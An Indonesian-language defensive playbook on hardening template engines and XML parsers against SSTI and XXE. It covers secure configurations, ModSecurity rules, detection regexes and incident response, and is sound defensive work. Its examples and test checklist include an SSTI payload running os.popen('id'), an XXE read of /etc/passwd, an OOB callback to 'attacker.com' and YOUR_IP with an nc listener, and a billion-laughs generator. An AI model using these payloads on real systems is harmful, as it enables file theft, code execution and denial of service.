---
title: "SSTI & XXE Defense Playbook — Hardening Template Engine & XML Parser: Blue Team Counter"
tags:
  - cyber-security
  - ssti
  - xxe
  - blue-team
  - defense
  - template-injection
  - xml-security
  - library
aliases:
  - "SSTI XXE Counter Playbook"
  - "Template & XML Defense"
created: "2026-08-11"
updated: "2026-08-11"
status: pending
cssclasses:
  - wide-table
---

> [!abstract] Ringkasan
> Dokumen counter blue-team untuk dua teknik serangan yang didokumentasikan di vault namun belum punya defense mendalam: **Server-Side Template Injection (SSTI)** — muncul di `[[web-hacking-exploitation]]` §3.4 dan `[[ctf-competition-methodology-strategy]]` — dan **XXE (XML External Entity)** yang hanya tersentuh lewat rule `XXE-001/002` di `[[reverse-shell-payloads-reference]]`. Playbook ini membalik arah: dari payload detection menjadi **hardening konfigurasi, mitigasi di layer parser/template engine, deteksi WAF/EDR, dan prosedur incident response** untuk kedua kelas kerentanan.

**Counter untuk:**
- `Web_App_Purple/web-hacking-exploitation.md` (SSTI §3.4)
- `ctf-competition-methodology-strategy.md` (SSTI checklist)
- `reverse-shell-payloads-reference.md` (XXE rule plan)
- `Threat_Intel_Privacy/comprehensive-threat-directory.md` (SSTI/XXE entry)

---

## Daftar Isi
- [[#1. Mengapa Dua Kerentanan Ini Dipasangkan]]
- [[#2. SSTI Defense — Pencegahan & Hardening]]
- [[#3. SSTI Detection — WAF & Runtime]]
- [[#4. XXE Defense — Konfigurasi Parser]]
- [[#5. XXE Detection — WAF & EDR]]
- [[#6. Implementation Blueprint — Python/Java/Go]]
- [[#7. Detection Rules — ModSecurity & CRS]]
- [[#8. Incident Response & Forensik]]
- [[#9. Testing & Verification Checklist]]
- [[#10. Referensi]]

---

## 1. Mengapa Dua Kerentanan Ini Dipasangkan

| Aspek | SSTI | XXE |
|---|---|---|
| **Akar masalah** | Input user dirender sebagai kode template | Input user diparse sebagai XML dengan entity eksternal aktif |
| **Vektor umum** | Name field, email subject, profile bio, report generator | SOAP/XML API, file upload (.svg, .docx, .xlsx), config import |
| **Dampak maksimal** | RCE penuh (Jinja2/Twig/FreeMarker) | SSRF, file read, DoS (billion laughs) |
| **Kesulitan deteksi** | Sedang — payload pendek `{{7*7}}` | Tinggi — blind OOB butuh callback server |
| **Akar mitigasi** | **Jangan pernah render input sebagai template** | **Matikan DTD & external entities di parser** |

**Kesamaan kunci:** keduanya adalah *parser injection* — aplikasi memercayai input sebagai data terstruktur (template/XML) tanpa boundary. Counter terkuat selalu di **konfigurasi parser**, bukan di filter input.

> [!warning] Perangkap Umum
> Blacklist payload (blokir `{{`, `}}`, `<!ENTITY`) selalu gagal jangka panjang — attacker punya ribuan alternatif encoding dan parser quirk. Fix di level parser = fix permanen.

---

## 2. SSTI Defense — Pencegahan & Hardening

### 2.1 Prinsip Utama

```plaintext
RULE 1: Input user = DATA, bukan CODE. Tidak pernah dirender sebagai template.
RULE 2: Kalau template engine wajib dipakai → SANDOX, bukan sekadar filter.
RULE 3: Konteks rendering harus eksplisit (escape), bukan default.
```

### 2.2 Hardening per Engine (Production-Grade)

| Engine | Konfigurasi Aman | Catatan |
|---|---|---|
| **Jinja2 (Python)** | `Environment(autoescape=True)` + **jangan pakai** `|safe`, `Markup`, `render_template_string` dengan input user | Sandbox bawaan Jinja2 bisa di-bypass — tambah layer sendiri |
| **Twig (PHP)** | `sandbox: true` + `policy` membatasi `include`, `extends`, fungsi `system` | Twig sandbox pernah punya CVE bypass |
| **FreeMarker (Java)** | **Jangan pernah** `new Configuration()` tanpa template loader terbatas | `?c` operator untuk escape otomatis |
| **Thymeleaf (Java)** | Hindari `th:inline="text"` pada user input; pakai `th:text` (escape otomatis) | Spring Boot `@ResponseBody` + `th:inline` = RCE |
| **ERB (Ruby)** | `ERB.new(...).result(binding)` dengan binding terbatas | Jangan render string dari user |
| **Handlebars (Node)** | `handlebars.compile` dengan helper whitelist + `noEscape: false` | Prototype pollution bisa bypass |

### 2.3 Pola Kode Aman (Python/Jinja2)

```python
# ❌ RENTAN — render string dari user
from jinja2 import Environment
template = request.form["template"]
return Environment().from_string(template).render(user=user)

# ✅ AMAN — render file template fixed, input sebagai data
from jinja2 import Environment, FileSystemLoader, select_autoescape
env = Environment(
    loader=FileSystemLoader("templates/"),          # hanya file dari disk
    autoescape=select_autoescape(["html", "xml"]),  # escape otomatis
)
# Template DIREKTORI, bukan string user
return env.get_template("profile.html").render(name=user_input)
```

### 2.4 Template Isolation (Sandbox Eksternal)

```plaintext
Arsitektur aman: render template di proses terpisah
┌──────────────┐     ┌──────────────────┐     ┌─────────────┐
│ Web App      │────▶│ Template Sandbox │────▶│ Filesystem  │
│ (tidak       │     │ (container,      │     │ (read-only, │
│  render)     │     │  no network,     │     │  no /etc,   │
└──────────────┘     │  timeout 2s)     │     │  no secrets)│
                     └──────────────────┘     └─────────────┘
```

- Render di **container terpisah** (gVisor/Firecracker) tanpa network egress
- **Timeout** render (2 detik) → cegah DoS via template loop
- **Filesystem read-only** → cegah file read post-RCE
- Log **semua exception render** → deteksi probing `{{7*7}}`

---

## 3. SSTI Detection — WAF & Runtime

### 3.1 Signature WAF (ModSecurity / CRS)

```apache
# Detect SSTI polyglot probing
SecRule REQUEST_URI|ARGS|REQUEST_BODY \
  "@rx \{\{.*(7\*7|config|self|_\_globals_\_|_\_class_\_)\}.*\}" \
  "id:941310,phase:2,deny,status:403,msg:'SSTI probing detected'"

# Detect common RCE chains (Jinja2)
SecRule ARGS|REQUEST_BODY \
  "@rx \{\{.*_\_class_\_.*_\_mro_\_.*_\_subclasses_\_\}\}" \
  "id:941311,phase:2,deny,status:403,msg:'SSTI RCE chain'"
```

> [!note] CRS 4.x sudah punya `REQUEST-941-APPLICATION-ATTACK-XSS.conf` dan rule SSTI partial — perkuat dengan rule custom di atas untuk chain RCE yang spesifik.

### 3.2 Runtime Detection (RASP/APM)

```python
# Middleware Python — deteksi output aneh dari render
import re

SSTI_RESULT_PATTERN = re.compile(
    r"(49|7\*7|_\_class_\_|_\_mro_\_|_\_subclasses_\_|_\_globals_\_|os\.system)"
)

def ssti_response_filter(response):
    # Cek body response untuk artefak evaluasi template
    if SSTI_RESULT_PATTERN.search(response.body) and \
       any(k in response.body for k in ("{{", "}}")):
        log_alert("SSTI_EVALUATION", response)
        return block_or_sanitize(response)
    return response
```

### 3.3 Golden Signals

| Signal | Arti |
|---|---|
| Request dengan `{{`, `${`, `<%` di field yang dirender | Probing SSTI |
| Response mengandung hasil evaluasi (`49`, path file, `__class__`) | Konfirmasi SSTI |
| Spike exception `TemplateSyntaxError` dari satu IP | Automated scanning |
| Request template string ke endpoint yang seharusnya render file | Konfigurasi salah |

---

## 4. XXE Defense — Konfigurasi Parser

### 4.1 Prinsip Utama

```plaintext
RULE 1: DTD = MATI. External entities = MATI. Selalu, di semua parser.
RULE 2: Kalau XML wajib → gunakan library yang secure-by-default (defusedxml).
RULE 3: Jangan pernah parse XML dari user tanpa batasan ukuran & depth.
```

### 4.2 Konfigurasi Aman per Bahasa (Copy-Paste Ready)

```python
# Python — WAJIB defusedxml, bukan xml.etree
import defusedxml.ElementTree as ET
tree = ET.parse(user_upload)   # secure by default: no DTD, no entities
```

```java
// Java — DocumentBuilderFactory secure
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

```go
// Go — encoding/xml tidak support DTD external entity (safe by default)
// TAPI tetap batasi ukuran & depth
import "encoding/xml"
dec := xml.NewDecoder(io.LimitReader(r, 10<<20)) // max 10MB
```

```php
// PHP — libxml_disable_entity_loader (deprecated di 8.0+)
libxml_disable_entity_loader(true);
// PHP 8+: LIBXML_NONET | LIBXML_NOENT dihapus dari default
$doc = new DOMDocument();
$doc->loadXML($input, LIBXML_NONET);
```

```csharp
// .NET — XmlReaderSettings secure
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;   // atau Ignore
settings.XmlResolver = null;                        // tidak ada resolver eksternal
```

### 4.3 Batasan Ekstra (Semua Bahasa)

| Batasan | Nilai Rekomendasi | Mencegah |
|---|---|---|
| Ukuran input | 1–10 MB (disesuaikan use case) | DoS memory |
| Depth XML | ≤ 64 level | Billion laughs & deep nesting |
| Jumlah entity | 0 (DTD mati) | Entity expansion |
| Waktu parse | 5 detik timeout | CPU DoS |
| Format alternatif | JSON/YAML/protobuf bila memungkinkan | Hilangkan attack surface |

### 4.4 Blind OOB XXE — Kenapa Konfigurasi Parser Saja Belum Cukup

```plaintext
Blind OOB: attacker kirim XML dengan entity ke URL attacker
<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://attacker.com/exfil">]>
<r>&xxe;</r>

Jika parser resolve → request keluar ke attacker.com → data bocor
```

**Counter tambahan:**
1. **Egress firewall** — blokir outbound dari app server ke internet (hanya proxy allowlist)
2. **Network segmentation** — app server tidak boleh akses metadata cloud (169.254.169.254)
3. **DNS monitoring** — alert query mencurigakan dari app server (lihat `[[dns-tunneling-deepdive]]` untuk deteksi)
4. **Log semua resolusi eksternal** di parser layer

---

## 5. XXE Detection — WAF & EDR

### 5.1 Signature WAF

```apache
# Detect DOCTYPE dengan SYSTEM/ENTITY
SecRule REQUEST_BODY \
  "@rx <!DOCTYPE[^>]*(SYSTEM|PUBLIC)|<!ENTITY[^>]*SYSTEM" \
  "id:941330,phase:2,deny,status:403,msg:'XXE DOCTYPE attempt'"

# Detect entity expansion attack (billion laughs pattern)
SecRule REQUEST_BODY \
  "@rx <!ENTITY[^>]*>[^<]*<!ENTITY[^>]*>[^<]*<!ENTITY[^>]*>" \
  "id:941331,phase:2,deny,status:403,msg:'Entity expansion chain'"
```

### 5.2 EDR/Network Detection

| Signal | Sumber | Arti |
|---|---|---|
| Request ke `169.254.169.254` dari app server | Firewall/NetFlow | Metadata cloud exfil (AWS/GCP/Azure) |
| Outbound HTTP dari XML parser process | eBPF/auditd | Blind OOB callback |
| Spike DNS query ke domain baru dari app server | DNS logs | Entity → URL exfil |
| Upload file `.svg`/`.docx` dengan DTD | File scan | XXE via dokumen |

### 5.3 eBPF Hook (Integrasi dengan `[[ebpf-kernel-security-roadmap]]`)

```c
// Konsep: trace koneksi outbound dari proses yang parse XML
// hook: tcp_connect / security_socket_connect
// filter: pid dari app server + dst port 80/443 + dst IP bukan allowlist
// action: log + alert (jangan block dulu — false positive tinggi)
```

---

## 6. Implementation Blueprint — Python/Java/Go

### 6.1 Python (FastAPI/Flask)

```python
# middleware_secure.py — gabungan SSTI + XXE protection
import defusedxml.ElementTree as ET
from jinja2 import Environment, FileSystemLoader, select_autoescape

class SecureRender:
    def __init__(self, template_dir: str):
        self.env = Environment(
            loader=FileSystemLoader(template_dir),
            autoescape=select_autoescape(["html", "xml"]),
        )

    def render(self, template_name: str, **data) -> str:
        # template_name harus dari whitelist, bukan input user
        assert template_name.endswith(".html")
        return self.env.get_template(template_name).render(**data)

def parse_xml_safe(data: bytes) -> ET.Element:
    if len(data) > 10 * 1024 * 1024:
        raise ValueError("XML too large")
    return ET.fromstring(data)  # defusedxml — DTD & entities mati
```

### 6.2 Java (Spring Boot)

```java
@Configuration
public class XmlSecurityConfig {
    @Bean
    public DocumentBuilderFactory secureDbf() {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        try {
            dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
            dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            dbf.setXIncludeAware(false);
            dbf.setExpandEntityReferences(false);
        } catch (ParserConfigurationException e) {
            throw new IllegalStateException("XML security misconfigured", e);
        }
        return dbf;
    }
}
```

### 6.3 Go (net/http)

```go
// main.go — egress guard + XML limit
func parseXML(r io.Reader) (*xml.Decoder, error) {
    limited := io.LimitReader(r, 10<<20) // 10MB cap
    dec := xml.NewDecoder(limited)
    dec.Strict = true                    // reject malformed
    return dec, nil
}

// Middleware: reject DOCTYPE di request body sebelum parse
func rejectDOCTYPE(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        body, _ := io.ReadAll(io.LimitReader(r.Body, 1<<20))
        if bytes.Contains(body, []byte("<!DOCTYPE")) {
            http.Error(w, "DTD not allowed", http.Status400)
            return
        }
        r.Body = io.NopCloser(bytes.NewReader(body))
        next.ServeHTTP(w, r)
    })
}
```

---

## 7. Detection Rules — ModSecurity & CRS

```apache
# /etc/modsecurity/custom/ssti-xxe.conf
# Load setelah CRS

# === SSTI ===
SecRule ARGS|ARGS_NAMES|REQUEST_BODY \
  "@rx \{\{(\{)?\s*(7\*7|config|self|request|application)\b" \
  "id:942001,phase:2,deny,status:403,msg:'SSTI probe',tag:'attack-ssti'"

SecRule ARGS|REQUEST_BODY \
  "@rx _\_class_\_|_\_mro_\_|_\_subclasses_\_|_\_globals_\_|_\_builtins_\_" \
  "id:942002,phase:2,deny,status:403,msg:'SSTI RCE chain',tag:'attack-ssti'"

SecRule ARGS|REQUEST_BODY \
  "@rx \$\{[^}]*\([^}]*\)\}" \
  "id:942003,phase:2,deny,status:403,msg:'SSTI FreeMarker eval',tag:'attack-ssti'"

# === XXE ===
SecRule REQUEST_BODY \
  "@rx <!DOCTYPE|<!ENTITY|SYSTEM\s+[\"'](file|http|ftp|gopher)" \
  "id:942010,phase:2,deny,status:403,msg:'XXE entity',tag:'attack-xxe'"

SecRule REQUEST_BODY \
  "@rx <!ENTITY[^>]{1,200}SYSTEM[^>]{1,200}[\"'][a-z]+:" \
  "id:942011,phase:2,deny,status:403,msg:'XXE external entity',tag:'attack-xxe'"
```

> [!tip] Test dengan CRS paranoia level — mulai PL1, naikkan ke PL2 untuk produksi. Lihat `[[owasp-crs-paranoia-levels-scoring]]`.

---

## 8. Incident Response & Forensik

### 8.1 SSTI Incident Flow

```plaintext
1. DETECT: alert rule 942001-003 / RASP filter
2. TRIAGE:  cek apakah evaluasi terjadi (response artifact 49 / __class__)
3. CONTAIN: revoke sesi, matikan endpoint sementara, backup log
4. ERADICATE: patch kode — pindah ke render file-only
5. RECOVER: audit semua user yang input-nya dirender, rotasi secret
6. LESSON: tambah rule WAF, training dev, tambah test SSTI di CI
```

### 8.2 XXE Incident Flow

```plaintext
1. DETECT: alert 942010-011 / egress firewall log ke 169.254.169.254
2. TRIAGE:  cek apakah parser resolve entity (log parser layer)
3. CONTAIN: block IP egress tujuan, isolasi app server
4. ERADICATE: patch parser config (defusedxml / DTD off), scan semua endpoint XML
5. RECOVER: cek data yang mungkin bocor via OOB callback, rotasi secret
6. LESSON: add egress firewall rule, test XXE di CI pipeline
```

### 8.3 Forensik Artefak

| Artefak | Lokasi | Kegunaan |
|---|---|---|
| Access log dengan payload `{{`/`<!DOCTYPE` | nginx/apache logs | IP attacker, timeline |
| Response log render error | app logs | Konfirmasi evaluasi |
| egress connection log | firewall/NetFlow | Blind OOB target |
| DNS query log | dnsmasq/BIND | Exfil domain |

---

## 9. Testing & Verification Checklist

### SSTI Verification

```bash
# 1. Probe (harus GAGAL kalau defense jalan)
curl -X POST https://target/api/render -d 'name={{7*7}}'     # expect 403/escaped
curl -X POST https://target/api/render -d 'name=${7*7}'      # expect 403/escaped
curl -X POST https://target/api/render -d 'name={{config}}'  # expect 403/escaped

# 2. RCE chain probe (harus GAGAL)
curl -X POST https://target/api/render \
  -d 'name={{self.__init__.__globals__["os"].popen("id").read()}}'

# 3. Auto-scan
nuclei -u https://target -t http/templates/ssti/
```

### XXE Verification

```bash
# 1. Basic entity (harus GAGAL — no file read)
curl -X POST https://target/api/xml -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'

# 2. Blind OOB (harus GAGAL — tidak ada callback)
# listener: nc -lvnp 4444
curl -X POST https://target/api/xml -H 'Content-Type: application/xml' \
  -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://YOUR_IP:4444/x">]><r>&xxe;</r>'

# 3. Billion laughs (harus GAGAL / timeout cepat)
python3 -c 'print("<!DOCTYPE r [" + "".join(f"<!ENTITY a{i} \"a{i-1}a{i-1}\">" for i in range(1,10)) + "]><r>&a9;</r>")' | curl -X POST https://target/api/xml -d @-

# 4. Auto-scan
nuclei -u https://target -t http/templates/xxe/
```

---

## 10. Referensi

- OWASP: [Server-Side Template Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.html)
- OWASP: [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- PortSwigger: [SSTI Research](https://portswigger.net/web-security/server-side-template-injection)
- PortSwigger: [XXE Research](https://portswigger.net/web-security/xxe)
- OWASP CRS: [REQUEST-941-APPLICATION-ATTACK-XSS.conf](https://github.com/coreruleset/coreruleset/blob/v4.0/main/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf) — #LOCAL juga di `/mnt/data_d/Projects/Reference/owasp-coreruleset/rules/`
- Python `defusedxml` docs: [defusedxml.readthedocs.io](https://defusedxml.readthedocs.io/)
- Java XML Security: [OWASP XML External Entity Prevention — Java](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java)
- HackTricks: [SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection.html)
- HackTricks: [XXE](https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html)
- PayloadsAllTheThings: `/mnt/data_d/Projects/Reference/PayloadsAllTheThings/Server Side Template Injection/` #LOCAL
- PayloadsAllTheThings: `/mnt/data_d/Projects/Reference/PayloadsAllTheThings/XXE Injection/` #LOCAL
- CVE-2018-1273 (Spring Data Commons SpEL injection) — [nvd.nist.gov](https://nvd.nist.gov/vuln/detail/CVE-2018-1273)
- CVE-2021-21349 (XXE in OWASP ESAPI) — [nvd.nist.gov](https://nvd.nist.gov/vuln/detail/CVE-2021-21349)
- Vault internal: `[[waf-reverse-proxy-deepdive]]` — implementasi WAF rules #LOCAL

**Cross-link vault:**
- [[web-hacking-exploitation]] — dokumen serangan yang di-counter (SSTI §3.4)
- [[ctf-competition-methodology-strategy]] — checklist SSTI
- [[reverse-shell-payloads-reference]] — rule plan XXE
- [[comprehensive-threat-directory]] — threat mapping
- [[owasp-crs-paranoia-levels-scoring]] — level deteksi CRS
- [[ebpf-kernel-security-roadmap]] — deteksi egress via eBPF
- [[dns-tunneling-deepdive]] — deteksi OOB callback via DNS
